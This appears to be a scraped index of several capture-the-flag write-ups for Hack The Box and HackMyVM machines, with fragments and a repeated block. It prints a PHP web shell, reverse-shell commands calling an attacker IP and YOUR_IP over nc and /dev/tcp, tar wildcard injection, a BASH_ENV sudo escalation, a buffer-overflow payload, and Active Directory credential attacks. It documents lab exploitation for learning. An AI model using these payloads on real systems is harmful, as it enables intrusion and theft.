We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

